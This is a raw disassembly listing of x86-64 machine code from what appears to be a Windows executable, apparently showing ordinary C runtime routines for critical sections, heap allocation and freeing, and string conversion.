   140005d52:	4c 8d 0d 9f 8e 00 00 	lea    0x8e9f(%rip),%r9        # 0x14000ebf8
   140005d59:	8b da                	mov    %edx,%ebx
   140005d5b:	4c 8d 05 8e 8e 00 00 	lea    0x8e8e(%rip),%r8        # 0x14000ebf0
   140005d62:	48 8b f9             	mov    %rcx,%rdi
   140005d65:	48 8d 15 ac 85 00 00 	lea    0x85ac(%rip),%rdx        # 0x14000e318
   140005d6c:	b9 12 00 00 00       	mov    $0x12,%ecx
   140005d71:	e8 3a fc ff ff       	call   0x1400059b0
   140005d76:	8b d3                	mov    %ebx,%edx
   140005d78:	48 8b cf             	mov    %rdi,%rcx
   140005d7b:	48 85 c0             	test   %rax,%rax
   140005d7e:	74 0b                	je     0x140005d8b
   140005d80:	44 8b c6             	mov    %esi,%r8d
   140005d83:	ff 15 ff 74 00 00    	call   *0x74ff(%rip)        # 0x14000d288
   140005d89:	eb 06                	jmp    0x140005d91
   140005d8b:	ff 15 d7 73 00 00    	call   *0x73d7(%rip)        # 0x14000d168
   140005d91:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005d96:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140005d9b:	48 83 c4 20          	add    $0x20,%rsp
   140005d9f:	5f                   	pop    %rdi
   140005da0:	c3                   	ret
   140005da1:	cc                   	int3
   140005da2:	cc                   	int3
   140005da3:	cc                   	int3
   140005da4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005da9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140005dae:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140005db3:	57                   	push   %rdi
   140005db4:	48 83 ec 50          	sub    $0x50,%rsp
   140005db8:	41 8b d9             	mov    %r9d,%ebx
   140005dbb:	49 8b f8             	mov    %r8,%rdi
   140005dbe:	8b f2                	mov    %edx,%esi
   140005dc0:	4c 8d 0d 39 8e 00 00 	lea    0x8e39(%rip),%r9        # 0x14000ec00
   140005dc7:	48 8b e9             	mov    %rcx,%rbp
   140005dca:	4c 8d 05 27 8e 00 00 	lea    0x8e27(%rip),%r8        # 0x14000ebf8
   140005dd1:	48 8d 15 28 8e 00 00 	lea    0x8e28(%rip),%rdx        # 0x14000ec00
   140005dd8:	b9 14 00 00 00       	mov    $0x14,%ecx
   140005ddd:	e8 ce fb ff ff       	call   0x1400059b0
   140005de2:	48 85 c0             	test   %rax,%rax
   140005de5:	74 52                	je     0x140005e39
   140005de7:	4c 8b 84 24 a0 00 00 	mov    0xa0(%rsp),%r8
   140005dee:	00 
   140005def:	44 8b cb             	mov    %ebx,%r9d
   140005df2:	48 8b 8c 24 98 00 00 	mov    0x98(%rsp),%rcx
   140005df9:	00 
   140005dfa:	8b d6                	mov    %esi,%edx
   140005dfc:	4c 89 44 24 40       	mov    %r8,0x40(%rsp)
   140005e01:	4c 8b c7             	mov    %rdi,%r8
   140005e04:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   140005e09:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   140005e10:	00 
   140005e11:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140005e16:	8b 8c 24 88 00 00 00 	mov    0x88(%rsp),%ecx
   140005e1d:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   140005e21:	48 8b 8c 24 80 00 00 	mov    0x80(%rsp),%rcx
   140005e28:	00 
   140005e29:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140005e2e:	48 8b cd             	mov    %rbp,%rcx
   140005e31:	ff 15 51 74 00 00    	call   *0x7451(%rip)        # 0x14000d288
   140005e37:	eb 32                	jmp    0x140005e6b
   140005e39:	33 d2                	xor    %edx,%edx
   140005e3b:	48 8b cd             	mov    %rbp,%rcx
   140005e3e:	e8 3d 00 00 00       	call   0x140005e80
   140005e43:	8b c8                	mov    %eax,%ecx
   140005e45:	44 8b cb             	mov    %ebx,%r9d
   140005e48:	8b 84 24 88 00 00 00 	mov    0x88(%rsp),%eax
   140005e4f:	4c 8b c7             	mov    %rdi,%r8
   140005e52:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140005e56:	8b d6                	mov    %esi,%edx
   140005e58:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   140005e5f:	00 
   140005e60:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140005e65:	ff 15 4d 73 00 00    	call   *0x734d(%rip)        # 0x14000d1b8
   140005e6b:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140005e70:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   140005e75:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   140005e7a:	48 83 c4 50          	add    $0x50,%rsp
   140005e7e:	5f                   	pop    %rdi
   140005e7f:	c3                   	ret
   140005e80:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005e85:	57                   	push   %rdi
   140005e86:	48 83 ec 20          	sub    $0x20,%rsp
   140005e8a:	8b fa                	mov    %edx,%edi
   140005e8c:	4c 8d 0d 85 8d 00 00 	lea    0x8d85(%rip),%r9        # 0x14000ec18
   140005e93:	48 8b d9             	mov    %rcx,%rbx
   140005e96:	48 8d 15 7b 8d 00 00 	lea    0x8d7b(%rip),%rdx        # 0x14000ec18
   140005e9d:	b9 16 00 00 00       	mov    $0x16,%ecx
   140005ea2:	4c 8d 05 67 8d 00 00 	lea    0x8d67(%rip),%r8        # 0x14000ec10
   140005ea9:	e8 02 fb ff ff       	call   0x1400059b0
   140005eae:	48 8b cb             	mov    %rbx,%rcx
   140005eb1:	48 85 c0             	test   %rax,%rax
   140005eb4:	74 0a                	je     0x140005ec0
   140005eb6:	8b d7                	mov    %edi,%edx
   140005eb8:	ff 15 ca 73 00 00    	call   *0x73ca(%rip)        # 0x14000d288
   140005ebe:	eb 05                	jmp    0x140005ec5
   140005ec0:	e8 df 34 00 00       	call   0x1400093a4
   140005ec5:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005eca:	48 83 c4 20          	add    $0x20,%rsp
   140005ece:	5f                   	pop    %rdi
   140005ecf:	c3                   	ret
   140005ed0:	48 89 7c 24 08       	mov    %rdi,0x8(%rsp)
   140005ed5:	48 8d 3d 44 25 01 00 	lea    0x12544(%rip),%rdi        # 0x140018420
   140005edc:	48 8d 05 4d 26 01 00 	lea    0x1264d(%rip),%rax        # 0x140018530
   140005ee3:	48 3b c7             	cmp    %rdi,%rax
   140005ee6:	48 8b 05 13 11 01 00 	mov    0x11113(%rip),%rax        # 0x140017000
   140005eed:	48 1b c9             	sbb    %rcx,%rcx
   140005ef0:	48 f7 d1             	not    %rcx
   140005ef3:	83 e1 22             	and    $0x22,%ecx
   140005ef6:	f3 48 ab             	rep stos %rax,(%rdi)
   140005ef9:	48 8b 7c 24 08       	mov    0x8(%rsp),%rdi
   140005efe:	b0 01                	mov    $0x1,%al
   140005f00:	c3                   	ret
   140005f01:	cc                   	int3
   140005f02:	cc                   	int3
   140005f03:	cc                   	int3
   140005f04:	40 53                	rex push %rbx
   140005f06:	48 83 ec 20          	sub    $0x20,%rsp
   140005f0a:	84 c9                	test   %cl,%cl
   140005f0c:	75 2f                	jne    0x140005f3d
   140005f0e:	48 8d 1d 6b 24 01 00 	lea    0x1246b(%rip),%rbx        # 0x140018380
   140005f15:	48 8b 0b             	mov    (%rbx),%rcx
   140005f18:	48 85 c9             	test   %rcx,%rcx
   140005f1b:	74 10                	je     0x140005f2d
   140005f1d:	48 83 f9 ff          	cmp    $0xffffffffffffffff,%rcx
   140005f21:	74 06                	je     0x140005f29
   140005f23:	ff 15 1f 71 00 00    	call   *0x711f(%rip)        # 0x14000d048
   140005f29:	48 83 23 00          	andq   $0x0,(%rbx)
   140005f2d:	48 83 c3 08          	add    $0x8,%rbx
   140005f31:	48 8d 05 e8 24 01 00 	lea    0x124e8(%rip),%rax        # 0x140018420
   140005f38:	48 3b d8             	cmp    %rax,%rbx
   140005f3b:	75 d8                	jne    0x140005f15
   140005f3d:	b0 01                	mov    $0x1,%al
   140005f3f:	48 83 c4 20          	add    $0x20,%rsp
   140005f43:	5b                   	pop    %rbx
   140005f44:	c3                   	ret
   140005f45:	cc                   	int3
   140005f46:	cc                   	int3
   140005f47:	cc                   	int3
   140005f48:	40 53                	rex push %rbx
   140005f4a:	48 83 ec 20          	sub    $0x20,%rsp
   140005f4e:	48 8b 05 db 25 01 00 	mov    0x125db(%rip),%rax        # 0x140018530
   140005f55:	48 8b da             	mov    %rdx,%rbx
   140005f58:	48 39 02             	cmp    %rax,(%rdx)
   140005f5b:	74 16                	je     0x140005f73
   140005f5d:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   140005f63:	85 05 47 18 01 00    	test   %eax,0x11847(%rip)        # 0x1400177b0
   140005f69:	75 08                	jne    0x140005f73
   140005f6b:	e8 ec 28 00 00       	call   0x14000885c
   140005f70:	48 89 03             	mov    %rax,(%rbx)
   140005f73:	48 83 c4 20          	add    $0x20,%rsp
   140005f77:	5b                   	pop    %rbx
   140005f78:	c3                   	ret
   140005f79:	cc                   	int3
   140005f7a:	cc                   	int3
   140005f7b:	cc                   	int3
   140005f7c:	40 53                	rex push %rbx
   140005f7e:	48 83 ec 20          	sub    $0x20,%rsp
   140005f82:	48 8b 05 ff 27 01 00 	mov    0x127ff(%rip),%rax        # 0x140018788
   140005f89:	48 8b da             	mov    %rdx,%rbx
   140005f8c:	48 39 02             	cmp    %rax,(%rdx)
   140005f8f:	74 16                	je     0x140005fa7
   140005f91:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   140005f97:	85 05 13 18 01 00    	test   %eax,0x11813(%rip)        # 0x1400177b0
   140005f9d:	75 08                	jne    0x140005fa7
   140005f9f:	e8 8c 15 00 00       	call   0x140007530
   140005fa4:	48 89 03             	mov    %rax,(%rbx)
   140005fa7:	48 83 c4 20          	add    $0x20,%rsp
   140005fab:	5b                   	pop    %rbx
   140005fac:	c3                   	ret
   140005fad:	cc                   	int3
   140005fae:	cc                   	int3
   140005faf:	cc                   	int3
   140005fb0:	48 83 ec 28          	sub    $0x28,%rsp
   140005fb4:	e8 fb f3 ff ff       	call   0x1400053b4
   140005fb9:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140005fbe:	48 8b 88 90 00 00 00 	mov    0x90(%rax),%rcx
   140005fc5:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140005fca:	48 8b c8             	mov    %rax,%rcx
   140005fcd:	e8 76 ff ff ff       	call   0x140005f48
   140005fd2:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140005fd7:	48 8b 00             	mov    (%rax),%rax
   140005fda:	48 83 c4 28          	add    $0x28,%rsp
   140005fde:	c3                   	ret
   140005fdf:	cc                   	int3
   140005fe0:	40 53                	rex push %rbx
   140005fe2:	48 83 ec 20          	sub    $0x20,%rsp
   140005fe6:	33 db                	xor    %ebx,%ebx
   140005fe8:	48 8d 15 51 25 01 00 	lea    0x12551(%rip),%rdx        # 0x140018540
   140005fef:	45 33 c0             	xor    %r8d,%r8d
   140005ff2:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   140005ff6:	48 8d 0c ca          	lea    (%rdx,%rcx,8),%rcx
   140005ffa:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   140005fff:	e8 3c fd ff ff       	call   0x140005d40
   140006004:	85 c0                	test   %eax,%eax
   140006006:	74 11                	je     0x140006019
   140006008:	ff 05 62 27 01 00    	incl   0x12762(%rip)        # 0x140018770
   14000600e:	ff c3                	inc    %ebx
   140006010:	83 fb 0e             	cmp    $0xe,%ebx
   140006013:	72 d3                	jb     0x140005fe8
   140006015:	b0 01                	mov    $0x1,%al
   140006017:	eb 09                	jmp    0x140006022
   140006019:	33 c9                	xor    %ecx,%ecx
   14000601b:	e8 24 00 00 00       	call   0x140006044
   140006020:	32 c0                	xor    %al,%al
   140006022:	48 83 c4 20          	add    $0x20,%rsp
   140006026:	5b                   	pop    %rbx
   140006027:	c3                   	ret
   140006028:	48 63 c1             	movslq %ecx,%rax
   14000602b:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   14000602f:	48 8d 05 0a 25 01 00 	lea    0x1250a(%rip),%rax        # 0x140018540
   140006036:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   14000603a:	48 ff 25 0f 71 00 00 	rex.W jmp *0x710f(%rip)        # 0x14000d150
   140006041:	cc                   	int3
   140006042:	cc                   	int3
   140006043:	cc                   	int3
   140006044:	40 53                	rex push %rbx
   140006046:	48 83 ec 20          	sub    $0x20,%rsp
   14000604a:	8b 1d 20 27 01 00    	mov    0x12720(%rip),%ebx        # 0x140018770
   140006050:	eb 1d                	jmp    0x14000606f
   140006052:	48 8d 05 e7 24 01 00 	lea    0x124e7(%rip),%rax        # 0x140018540
   140006059:	ff cb                	dec    %ebx
   14000605b:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   14000605f:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   140006063:	ff 15 f7 70 00 00    	call   *0x70f7(%rip)        # 0x14000d160
   140006069:	ff 0d 01 27 01 00    	decl   0x12701(%rip)        # 0x140018770
   14000606f:	85 db                	test   %ebx,%ebx
   140006071:	75 df                	jne    0x140006052
   140006073:	b0 01                	mov    $0x1,%al
   140006075:	48 83 c4 20          	add    $0x20,%rsp
   140006079:	5b                   	pop    %rbx
   14000607a:	c3                   	ret
   14000607b:	cc                   	int3
   14000607c:	48 63 c1             	movslq %ecx,%rax
   14000607f:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140006083:	48 8d 05 b6 24 01 00 	lea    0x124b6(%rip),%rax        # 0x140018540
   14000608a:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   14000608e:	48 ff 25 c3 70 00 00 	rex.W jmp *0x70c3(%rip)        # 0x14000d158
   140006095:	cc                   	int3
   140006096:	cc                   	int3
   140006097:	cc                   	int3
   140006098:	40 53                	rex push %rbx
   14000609a:	48 83 ec 20          	sub    $0x20,%rsp
   14000609e:	48 8b d9             	mov    %rcx,%rbx
   1400060a1:	48 83 f9 e0          	cmp    $0xffffffffffffffe0,%rcx
   1400060a5:	77 3c                	ja     0x1400060e3
   1400060a7:	48 85 c9             	test   %rcx,%rcx
   1400060aa:	b8 01 00 00 00       	mov    $0x1,%eax
   1400060af:	48 0f 44 d8          	cmove  %rax,%rbx
   1400060b3:	eb 15                	jmp    0x1400060ca
   1400060b5:	e8 22 e8 ff ff       	call   0x1400048dc
   1400060ba:	85 c0                	test   %eax,%eax
   1400060bc:	74 25                	je     0x1400060e3
   1400060be:	48 8b cb             	mov    %rbx,%rcx
   1400060c1:	e8 6a da ff ff       	call   0x140003b30
   1400060c6:	85 c0                	test   %eax,%eax
   1400060c8:	74 19                	je     0x1400060e3
   1400060ca:	48 8b 0d 0f 2b 01 00 	mov    0x12b0f(%rip),%rcx        # 0x140018be0
   1400060d1:	4c 8b c3             	mov    %rbx,%r8
   1400060d4:	33 d2                	xor    %edx,%edx
   1400060d6:	ff 15 e4 70 00 00    	call   *0x70e4(%rip)        # 0x14000d1c0
   1400060dc:	48 85 c0             	test   %rax,%rax
   1400060df:	74 d4                	je     0x1400060b5
   1400060e1:	eb 0d                	jmp    0x1400060f0
   1400060e3:	e8 a8 f8 ff ff       	call   0x140005990
   1400060e8:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   1400060ee:	33 c0                	xor    %eax,%eax
   1400060f0:	48 83 c4 20          	add    $0x20,%rsp
   1400060f4:	5b                   	pop    %rbx
   1400060f5:	c3                   	ret
   1400060f6:	cc                   	int3
   1400060f7:	cc                   	int3
   1400060f8:	40 53                	rex push %rbx
   1400060fa:	48 83 ec 20          	sub    $0x20,%rsp
   1400060fe:	4c 8b c2             	mov    %rdx,%r8
   140006101:	48 8b d9             	mov    %rcx,%rbx
   140006104:	48 85 c9             	test   %rcx,%rcx
   140006107:	74 0e                	je     0x140006117
   140006109:	33 d2                	xor    %edx,%edx
   14000610b:	48 8d 42 e0          	lea    -0x20(%rdx),%rax
   14000610f:	48 f7 f3             	div    %rbx
   140006112:	49 3b c0             	cmp    %r8,%rax
   140006115:	72 43                	jb     0x14000615a
   140006117:	49 0f af d8          	imul   %r8,%rbx
   14000611b:	b8 01 00 00 00       	mov    $0x1,%eax
   140006120:	48 85 db             	test   %rbx,%rbx
   140006123:	48 0f 44 d8          	cmove  %rax,%rbx
   140006127:	eb 15                	jmp    0x14000613e
   140006129:	e8 ae e7 ff ff       	call   0x1400048dc
   14000612e:	85 c0                	test   %eax,%eax
   140006130:	74 28                	je     0x14000615a
   140006132:	48 8b cb             	mov    %rbx,%rcx
   140006135:	e8 f6 d9 ff ff       	call   0x140003b30
   14000613a:	85 c0                	test   %eax,%eax
   14000613c:	74 1c                	je     0x14000615a
   14000613e:	48 8b 0d 9b 2a 01 00 	mov    0x12a9b(%rip),%rcx        # 0x140018be0
   140006145:	4c 8b c3             	mov    %rbx,%r8
   140006148:	ba 08 00 00 00       	mov    $0x8,%edx
   14000614d:	ff 15 6d 70 00 00    	call   *0x706d(%rip)        # 0x14000d1c0
   140006153:	48 85 c0             	test   %rax,%rax
   140006156:	74 d1                	je     0x140006129
   140006158:	eb 0d                	jmp    0x140006167
   14000615a:	e8 31 f8 ff ff       	call   0x140005990
   14000615f:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   140006165:	33 c0                	xor    %eax,%eax
   140006167:	48 83 c4 20          	add    $0x20,%rsp
   14000616b:	5b                   	pop    %rbx
   14000616c:	c3                   	ret
   14000616d:	cc                   	int3
   14000616e:	cc                   	int3
   14000616f:	cc                   	int3
   140006170:	48 85 c9             	test   %rcx,%rcx
   140006173:	74 37                	je     0x1400061ac
   140006175:	53                   	push   %rbx
   140006176:	48 83 ec 20          	sub    $0x20,%rsp
   14000617a:	4c 8b c1             	mov    %rcx,%r8
   14000617d:	33 d2                	xor    %edx,%edx
   14000617f:	48 8b 0d 5a 2a 01 00 	mov    0x12a5a(%rip),%rcx        # 0x140018be0
   140006186:	ff 15 3c 70 00 00    	call   *0x703c(%rip)        # 0x14000d1c8
   14000618c:	85 c0                	test   %eax,%eax
   14000618e:	75 17                	jne    0x1400061a7
   140006190:	e8 fb f7 ff ff       	call   0x140005990
   140006195:	48 8b d8             	mov    %rax,%rbx
   140006198:	ff 15 7a 6e 00 00    	call   *0x6e7a(%rip)        # 0x14000d018
   14000619e:	8b c8                	mov    %eax,%ecx
   1400061a0:	e8 33 f7 ff ff       	call   0x1400058d8
   1400061a5:	89 03                	mov    %eax,(%rbx)
   1400061a7:	48 83 c4 20          	add    $0x20,%rsp
   1400061ab:	5b                   	pop    %rbx
   1400061ac:	c3                   	ret
   1400061ad:	cc                   	int3
   1400061ae:	cc                   	int3
   1400061af:	cc                   	int3
   1400061b0:	48 3b ca             	cmp    %rdx,%rcx
   1400061b3:	73 04                	jae    0x1400061b9
   1400061b5:	83 c8 ff             	or     $0xffffffff,%eax
   1400061b8:	c3                   	ret
   1400061b9:	33 c0                	xor    %eax,%eax
   1400061bb:	48 3b ca             	cmp    %rdx,%rcx
   1400061be:	0f 97 c0             	seta   %al
   1400061c1:	c3                   	ret
   1400061c2:	cc                   	int3
   1400061c3:	cc                   	int3
   1400061c4:	48 8b c4             	mov    %rsp,%rax
   1400061c7:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1400061cb:	48 89 68 10          	mov    %rbp,0x10(%rax)
   1400061cf:	48 89 70 18          	mov    %rsi,0x18(%rax)
   1400061d3:	48 89 78 20          	mov    %rdi,0x20(%rax)
   1400061d7:	41 56                	push   %r14
   1400061d9:	48 83 ec 30          	sub    $0x30,%rsp
   1400061dd:	33 db                	xor    %ebx,%ebx
   1400061df:	41 8b e8             	mov    %r8d,%ebp
   1400061e2:	48 8b fa             	mov    %rdx,%rdi
   1400061e5:	48 8b f1             	mov    %rcx,%rsi
   1400061e8:	48 85 c9             	test   %rcx,%rcx
   1400061eb:	75 22                	jne    0x14000620f
   1400061ed:	38 5a 28             	cmp    %bl,0x28(%rdx)
   1400061f0:	74 0c                	je     0x1400061fe
   1400061f2:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   1400061f6:	e8 75 ff ff ff       	call   0x140006170
   1400061fb:	88 5f 28             	mov    %bl,0x28(%rdi)
   1400061fe:	48 89 5f 10          	mov    %rbx,0x10(%rdi)
   140006202:	48 89 5f 18          	mov    %rbx,0x18(%rdi)
   140006206:	48 89 5f 20          	mov    %rbx,0x20(%rdi)
   14000620a:	e9 0e 01 00 00       	jmp    0x14000631d
   14000620f:	38 19                	cmp    %bl,(%rcx)
   140006211:	75 55                	jne    0x140006268
   140006213:	48 39 5a 18          	cmp    %rbx,0x18(%rdx)
   140006217:	75 46                	jne    0x14000625f
   140006219:	38 5a 28             	cmp    %bl,0x28(%rdx)
   14000621c:	74 0c                	je     0x14000622a
   14000621e:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   140006222:	e8 49 ff ff ff       	call   0x140006170
   140006227:	88 5f 28             	mov    %bl,0x28(%rdi)
   14000622a:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000622f:	e8 64 fe ff ff       	call   0x140006098
   140006234:	48 89 47 10          	mov    %rax,0x10(%rdi)
   140006238:	48 8b cb             	mov    %rbx,%rcx
   14000623b:	48 f7 d8             	neg    %rax
   14000623e:	1b d2                	sbb    %edx,%edx
   140006240:	f7 d2                	not    %edx
   140006242:	83 e2 0c             	and    $0xc,%edx
   140006245:	0f 94 c1             	sete   %cl
   140006248:	85 d2                	test   %edx,%edx
   14000624a:	0f 94 c0             	sete   %al
   14000624d:	88 47 28             	mov    %al,0x28(%rdi)
   140006250:	48 89 4f 18          	mov    %rcx,0x18(%rdi)
   140006254:	85 d2                	test   %edx,%edx
   140006256:	74 07                	je     0x14000625f
   140006258:	8b da                	mov    %edx,%ebx
   14000625a:	e9 be 00 00 00       	jmp    0x14000631d
   14000625f:	48 8b 47 10          	mov    0x10(%rdi),%rax
   140006263:	66 89 18             	mov    %bx,(%rax)
   140006266:	eb 9e                	jmp    0x140006206
   140006268:	41 83 c9 ff          	or     $0xffffffff,%r9d
   14000626c:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140006270:	4c 8b c6             	mov    %rsi,%r8
   140006273:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140006278:	8b cd                	mov    %ebp,%ecx
   14000627a:	41 8d 51 0a          	lea    0xa(%r9),%edx
   14000627e:	e8 39 16 00 00       	call   0x1400078bc
   140006283:	4c 63 f0             	movslq %eax,%r14
   140006286:	85 c0                	test   %eax,%eax
   140006288:	75 16                	jne    0x1400062a0
   14000628a:	ff 15 88 6d 00 00    	call   *0x6d88(%rip)        # 0x14000d018
   140006290:	8b c8                	mov    %eax,%ecx
   140006292:	e8 89 f6 ff ff       	call   0x140005920
   140006297:	e8 f4 f6 ff ff       	call   0x140005990
   14000629c:	8b 18                	mov    (%rax),%ebx
   14000629e:	eb 7d                	jmp    0x14000631d
   1400062a0:	48 8b 4f 18          	mov    0x18(%rdi),%rcx
   1400062a4:	4c 3b f1             	cmp    %rcx,%r14
   1400062a7:	76 43                	jbe    0x1400062ec
   1400062a9:	38 5f 28             	cmp    %bl,0x28(%rdi)
   1400062ac:	74 0c                	je     0x1400062ba
   1400062ae:	48 8b 4f 10          	mov    0x10(%rdi),%rcx
   1400062b2:	e8 b9 fe ff ff       	call   0x140006170
   1400062b7:	88 5f 28             	mov    %bl,0x28(%rdi)
   1400062ba:	4b 8d 0c 36          	lea    (%r14,%r14,1),%rcx
   1400062be:	e8 d5 fd ff ff       	call   0x140006098
   1400062c3:	48 89 47 10          	mov    %rax,0x10(%rdi)
   1400062c7:	48 8b cb             	mov    %rbx,%rcx
   1400062ca:	48 f7 d8             	neg    %rax
   1400062cd:	1b d2                	sbb    %edx,%edx
   1400062cf:	f7 d2                	not    %edx
   1400062d1:	83 e2 0c             	and    $0xc,%edx
   1400062d4:	49 0f 44 ce          	cmove  %r14,%rcx
   1400062d8:	85 d2                	test   %edx,%edx
   1400062da:	0f 94 c0             	sete   %al
   1400062dd:	88 47 28             	mov    %al,0x28(%rdi)
   1400062e0:	48 89 4f 18          	mov    %rcx,0x18(%rdi)
   1400062e4:	85 d2                	test   %edx,%edx
   1400062e6:	0f 85 6c ff ff ff    	jne    0x140006258
   1400062ec:	48 8b 47 10          	mov    0x10(%rdi),%rax
   1400062f0:	41 83 c9 ff          	or     $0xffffffff,%r9d
   1400062f4:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   1400062f8:	4c 8b c6             	mov    %rsi,%r8
   1400062fb:	8b cd                	mov    %ebp,%ecx
   1400062fd:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006302:	41 8d 51 0a          	lea    0xa(%r9),%edx
   140006306:	e8 b1 15 00 00       	call   0x1400078bc
   14000630b:	48 63 c8             	movslq %eax,%rcx
   14000630e:	85 c0                	test   %eax,%eax
   140006310:	0f 84 74 ff ff ff    	je     0x14000628a
   140006316:	48 ff c9             	dec    %rcx
   140006319:	48 89 4f 20          	mov    %rcx,0x20(%rdi)
   14000631d:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140006322:	8b c3                	mov    %ebx,%eax
   140006324:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140006329:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   14000632e:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   140006333:	48 83 c4 30          	add    $0x30,%rsp
   140006337:	41 5e                	pop    %r14
   140006339:	c3                   	ret
   14000633a:	cc                   	int3
   14000633b:	cc                   	int3
   14000633c:	48 8b c4             	mov    %rsp,%rax
   14000633f:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140006343:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140006347:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000634b:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000634f:	41 56                	push   %r14
   140006351:	48 83 ec 40          	sub    $0x40,%rsp
   140006355:	33 db                	xor    %ebx,%ebx
   140006357:	45 8b f0             	mov    %r8d,%r14d
   14000635a:	48 8b fa             	mov    %rdx,%rdi
   14000635d:	48 8b f1             	mov    %rcx,%rsi
   140006360:	48 85 c9             	test   %rcx,%rcx
   140006363:	75 22                	jne    0x140006387
   140006365:	38 5a 28             	cmp    %bl,0x28(%rdx)
   140006368:	74 0c                	je     0x140006376
   14000636a:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   14000636e:	e8 fd fd ff ff       	call   0x140006170
   140006373:	88 5f 28             	mov    %bl,0x28(%rdi)
   140006376:	48 89 5f 10          	mov    %rbx,0x10(%rdi)
   14000637a:	48 89 5f 18          	mov    %rbx,0x18(%rdi)
   14000637e:	48 89 5f 20          	mov    %rbx,0x20(%rdi)
   140006382:	e9 22 01 00 00       	jmp    0x1400064a9
   140006387:	66 39 19             	cmp    %bx,(%rcx)
   14000638a:	75 54                	jne    0x1400063e0
   14000638c:	48 39 5a 18          	cmp    %rbx,0x18(%rdx)
   140006390:	75 46                	jne    0x1400063d8
   140006392:	38 5a 28             	cmp    %bl,0x28(%rdx)
   140006395:	74 0c                	je     0x1400063a3
   140006397:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   14000639b:	e8 d0 fd ff ff       	call   0x140006170
   1400063a0:	88 5f 28             	mov    %bl,0x28(%rdi)
   1400063a3:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400063a8:	e8 eb fc ff ff       	call   0x140006098
   1400063ad:	48 89 47 10          	mov    %rax,0x10(%rdi)
   1400063b1:	48 8b cb             	mov    %rbx,%rcx
   1400063b4:	48 f7 d8             	neg    %rax
   1400063b7:	1b d2                	sbb    %edx,%edx
   1400063b9:	f7 d2                	not    %edx
   1400063bb:	83 e2 0c             	and    $0xc,%edx
   1400063be:	0f 94 c1             	sete   %cl
   1400063c1:	85 d2                	test   %edx,%edx
   1400063c3:	0f 94 c0             	sete   %al
   1400063c6:	88 47 28             	mov    %al,0x28(%rdi)
   1400063c9:	48 89 4f 18          	mov    %rcx,0x18(%rdi)
   1400063cd:	85 d2                	test   %edx,%edx
   1400063cf:	74 07                	je     0x1400063d8
   1400063d1:	8b da                	mov    %edx,%ebx
   1400063d3:	e9 d1 00 00 00       	jmp    0x1400064a9
   1400063d8:	48 8b 47 10          	mov    0x10(%rdi),%rax
   1400063dc:	88 18                	mov    %bl,(%rax)
   1400063de:	eb 9e                	jmp    0x14000637e
   1400063e0:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   1400063e5:	41 83 c9 ff          	or     $0xffffffff,%r9d
   1400063e9:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   1400063ee:	4c 8b c6             	mov    %rsi,%r8
   1400063f1:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   1400063f5:	33 d2                	xor    %edx,%edx
   1400063f7:	41 8b ce             	mov    %r14d,%ecx
   1400063fa:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400063ff:	e8 14 15 00 00       	call   0x140007918
   140006404:	48 63 e8             	movslq %eax,%rbp
   140006407:	85 c0                	test   %eax,%eax
   140006409:	75 19                	jne    0x140006424
   14000640b:	ff 15 07 6c 00 00    	call   *0x6c07(%rip)        # 0x14000d018
   140006411:	8b c8                	mov    %eax,%ecx
   140006413:	e8 08 f5 ff ff       	call   0x140005920
   140006418:	e8 73 f5 ff ff       	call   0x140005990
   14000641d:	8b 18                	mov    (%rax),%ebx
   14000641f:	e9 85 00 00 00       	jmp    0x1400064a9
